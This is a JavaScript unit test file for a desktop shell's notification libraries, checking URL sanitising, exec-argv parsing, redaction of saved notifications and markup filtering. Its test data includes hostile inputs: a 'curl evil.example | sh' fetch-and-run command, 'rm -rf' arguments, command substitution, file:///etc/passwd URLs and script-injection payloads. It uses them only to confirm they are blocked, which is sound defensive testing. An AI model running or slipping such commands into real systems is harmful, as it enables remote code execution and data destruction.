// Unit tests for shell/Commons/notify/*.js: the notification libraries copied
// from omarchy (Security, Detect, Markup, Store, Delivery), loaded the way QML
// does, plus the Marchyo deltas (hint names, the trusted gate).
//
// Run: node tests/shell/notify-lib-test.js   (also a `nix flake check` check)

"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const dir = path.join(__dirname, "..", "..", "shell", "Commons", "notify");
const cache = {};

function load(name) {
  if (cache[name]) return cache[name];
  const scope = { console, Qt: { openUrlExternally: (u) => u } };
  const code = fs
    .readFileSync(path.join(dir, name + ".js"), "utf8")
    .replace(/^\.pragma.*$/gm, "")
    .replace(/^\.import "([^"]+)" as (\w+)$/gm, (_, file, alias) => {
      scope[alias] = load(file.replace(/\.js$/, ""));
      return "";
    });
  vm.createContext(scope);
  vm.runInContext(code, scope);
  return (cache[name] = scope);
}

const S = load("Security");
const D = load("Detect");
const M = load("Markup");
const Store = load("Store");
const Delivery = load("Delivery");

let passed = 0;
function test(name, fn) {
  try {
    fn();
  } catch (error) {
    console.error("not ok - " + name);
    console.error(String(error.stack || error.message).replace(/^/gm, "    "));
    process.exit(1);
  }
  passed++;
  console.log("ok - " + name);
}

const snap = (n, trusted) => Store.snapshot(n, "k", { Normal: 1 }, trusted);
const same = (a, b) => assert.equal(JSON.stringify(a), JSON.stringify(b));

test("every copied file names its provenance", () => {
  for (const f of ["Security", "Detect", "Markup", "Store", "Delivery"]) {
    const head = fs.readFileSync(path.join(dir, f + ".js"), "utf8").split("\n").slice(0, 3).join("\n");
    assert.match(head, /Copied from omacom\/omarchy/, f);
    assert.match(head, /[0-9a-f]{40}/, f);
  }
});

test("external URLs: only plain http(s) and one mailto address", () => {
  const bad = [
    "https://paypal.com@evil.example",
    "javascript:alert(1)",
    "file:///etc/passwd",
    "https://example.com/%0d%0a",
    "http://0x7f.0x0.0x0.0x1/",
    "http://2130706433/",
    "https://[::1]",
    "https://example.com:99999",
    "https://example.com/" + "x".repeat(4096),
  ];
  for (const u of bad) assert.equal(S.safeExternalUrl(u), "", u);
  for (const u of ["https://example.com", "http://example.com/p?q=1", "mailto:user@example.com"])
    assert.ok(S.safeExternalUrl(u), u);
  assert.equal(S.safeMailtoUrl("mailto:user@example.com?attach=/etc/passwd"), "");
});

test("parseExecArgv fails closed", () => {
  same(S.parseExecArgv('["marchyo","shell","open","setup"]'), ["marchyo", "shell", "open", "setup"]);
  same(S.parseExecArgv(["a", "b"]), ["a", "b"]);
  for (const v of ["", "[]", "{}", "not json", '["-rf","/"]', '[""]', "[1]", '["a\\u0000b"]', JSON.stringify(Array(33).fill("a"))])
    assert.equal(S.parseExecArgv(v), null, v);
  // A shell metacharacter in a word is one word.
  same(S.parseExecArgv('["echo","$(touch /tmp/x); rm -rf ~"]'), ["echo", "$(touch /tmp/x); rm -rf ~"]);
});

test("parseExecActions holds each action to the argv rules and caps at three", () => {
  const ok = JSON.stringify([{ label: "Open", argv: ["xdg-open", "x"] }]);
  same(S.parseExecActions(ok), [{ label: "Open", argv: ["xdg-open", "x"] }]);
  const four = JSON.stringify(Array(4).fill({ label: "a", argv: ["a"] }));
  assert.equal(S.parseExecActions(four), null);
  assert.equal(S.parseExecActions(JSON.stringify([{ label: "x", argv: ["-bad"] }])), null);
  assert.equal(S.parseExecActions(JSON.stringify([{ label: " ", argv: ["a"] }])), null);
});

test("snapshot ignores the exec and actions hints unless trusted", () => {
  const hints = {
    "marchyo-exec-argv": '["marchyo","shell","open","setup"]',
    "marchyo-actions": JSON.stringify([{ label: "Go", argv: ["marchyo", "x"] }]),
    "marchyo-glyph": "\u{f009a}",
  };
  const n = { appName: "marchyo-action", summary: "s", body: "b", hints };
  assert.equal(snap(n, false).execArgv, "");
  assert.equal(snap(n, false).execActions, "");
  assert.equal(snap(n).execArgv, "");
  assert.equal(snap(n, true).execArgv, '["marchyo","shell","open","setup"]');
  assert.match(snap(n, true).execActions, /Go/);
  assert.equal(snap(n, false).glyph, "");
  assert.equal(snap(n).glyph, "");
  assert.equal(snap(n, true).glyph, "\u{f009a}");
  // The omarchy spellings are not honoured.
  const old = { appName: "x", summary: "s", hints: { "omarchy-exec-argv": '["a"]' } };
  assert.equal(snap(old, true).execArgv, "");
});

test("a verification code persists only as a placeholder", () => {
  const row = snap({ appName: "Bank", summary: "Sign in", body: "Your verification code is 482913" }, false);
  assert.equal(row.code, "482913");
  const saved = Store.sanitiseForPersistence(row);
  assert.equal(saved.summary, "Verification notification");
  assert.equal(saved.body, "[redacted]");
  assert.ok(Store.redacted(saved));
  assert.ok(!JSON.stringify(Store.persistable(row)).includes("482913"));
  assert.ok(!("execArgv" in Store.persistable(row)));
});

test("persistable drops the exec argv, buttons, images and links", () => {
  const row = snap(
    { appName: "marchyo-action", summary: "Hi", body: "see https://example.com/x", image: "/tmp/a.png", hints: { "marchyo-exec-argv": '["a","b"]' } },
    true,
  );
  const stored = Store.persistable(row);
  assert.ok(!("execArgv" in stored));
  assert.ok(!("execActions" in stored));
  assert.equal(Store.restored(stored).execArgv, "");
  assert.ok(!("image" in stored));
  assert.ok(!("link" in stored));
  assert.equal(Store.restored(stored).link, "https://example.com/x");
});

test("a restored row gets the grace, critical waits for the user", () => {
  const normal = Store.restored(Store.persistable(snap({ appName: "a", summary: "s" })));
  assert.equal(normal.duration, 20000);
  assert.equal(normal.restored, true);
  const critical = Store.restored(Store.persistable(snap({ appName: "a", summary: "s", urgency: 2 })));
  assert.equal(critical.duration, 0);
});

test("a tampered stored row is held to today's rules", () => {
  const live = JSON.stringify([
    { key: "bad key!", summary: "x" },
    { key: "ok", summary: "y", execArgv: '["-rf","/"]', link: "https://evil.example/phish" },
    "nope",
    { key: "ok", summary: "dup" },
  ]);
  const rows = Store.parseLive(live);
  assert.equal(rows.length, 1);
  assert.ok(!("execArgv" in rows[0]));
  assert.equal(Store.parseLive("x".repeat(10 * 1024 * 1024)).length, 0);
  assert.equal(Store.parseLive("{}").length, 0);
});

test("a well-formed hostile argv in the live file never comes back", () => {
  const live = JSON.stringify([
    {
      key: "evil",
      app: "marchyo-action",
      summary: "Reboot",
      execArgv: '["sh","-c","curl evil.example | sh"]',
      execActions: JSON.stringify([{ label: "Update", argv: ["sh", "-c", "id"] }]),
    },
  ]);
  const rows = Store.parseLive(live);
  assert.equal(rows.length, 1);
  assert.ok(!("execArgv" in rows[0]) && !("execActions" in rows[0]));
  const row = Store.restored(rows[0]);
  assert.equal(row.execArgv, "");
  assert.equal(row.execActions, "");
  const again = Store.parseLive(Store.serialise([Store.persistable(row)]));
  assert.ok(!JSON.stringify(again).includes("curl evil"));
});

test("history keeps the recent past and records why a row closed", () => {
  const now = 2_000_000_000;
  const e = Store.closedEntry(snap({ appName: "a", summary: "s" }), "dismissed", now);
  assert.equal(e.closed_reason, "dismissed");
  const old = Store.closedEntry(snap({ appName: "a", summary: "old" }), "expired", now - 25 * 3600);
  const kept = Store.addHistory([old], e, now);
  assert.equal(kept.length, 1);
  assert.equal(Store.closedEntry(snap({ summary: "s" }), "Bad Reason!", now).closed_reason, "");
});

test("quiet.json: do-not-disturb round-trips and rejects junk", () => {
  assert.equal(Store.parseQuiet(Store.serialiseQuiet({ dnd: true })).dnd, true);
  assert.equal(Store.parseQuiet(Store.serialiseQuiet({ dnd: false })).dnd, false);
  for (const v of ["", "[]", "nope", '"x"', "null"]) assert.equal(Store.parseQuiet(v), null, v);
  assert.equal(Store.parseQuiet('{"dnd":"yes"}').dnd, false);
});

test("live rows: a newer row replaces the same key, the oldest go over the limit", () => {
  let rows = [];
  for (let i = 0; i < 105; i++) rows = Store.putLive(rows, { key: "k" + i });
  assert.equal(rows.length, 100);
  assert.equal(rows[0].key, "k5");
  rows = Store.putLive(rows, { key: "k50", summary: "new" });
  assert.equal(rows.length, 100);
  assert.equal(Store.liveEntry(rows, "k50").summary, "new");
  assert.equal(Store.dropLive(rows, "k50").length, 99);
});

test("Delivery: marchyo-action passes quiet, ephemeral rows, deeds order", () => {
  assert.equal(Delivery.bypassesQuiet({ app: "marchyo-action", urgency: 0 }), true);
  assert.equal(Delivery.bypassesQuiet({ app: "omarchy-action", urgency: 0 }), false);
  assert.equal(Delivery.bypassesQuiet({ app: "notify-send", urgency: 2 }), true);
  assert.equal(Delivery.bypassesQuiet({ app: "Slack", urgency: 2 }), false);
  assert.equal(Delivery.isEphemeral({ app: "marchyo-action" }), true);
  assert.equal(Delivery.isEphemeral({ app: "Chat", transient: true }), true);
  assert.equal(Delivery.isEphemeral({ app: "Chat" }), false);
  const deeds = Delivery.deeds(
    { codes: "482913", execActions: JSON.stringify([{ label: "Edit", argv: ["x"] }]) },
    [{ id: "a", text: "Reply" }],
  );
  same(deeds.map((d) => d.kind), ["code", "exec", "action"]);
  assert.equal(Delivery.deeds({}, []).length, 0);
});

test("Detect: codes need the sender's own words, links are checked", () => {
  same(D.codes("Your verification code is 482913"), ["482913"]);
  same(D.codes("Build 482913 passed"), []);
  same(D.links("see https://example.com/a, and javascript:alert(1)"), ["https://example.com/a"]);
});

test("Markup keeps only the safe subset", () => {
  for (const body of ['<img src="file:///etc/passwd">', "<script>alert(1)</script>", '<a href="javascript:alert(1)">x</a>'])
    assert.ok(!/<(?:img|script|iframe|svg)\b|href="javascript/i.test(M.render(body)), body);
  assert.equal(M.render("<b>x</b>"), "<b>x</b>");
});

test("parsers stay fast on hostile input", () => {
  const start = Date.now();
  for (const text of ["<".repeat(32768), "&amp;".repeat(6500), "9".repeat(32768), "https://".repeat(4000)]) {
    M.render(text);
    D.scan("", text);
  }
  assert.ok(Date.now() - start < 3000);
});

console.log(passed + " passed");
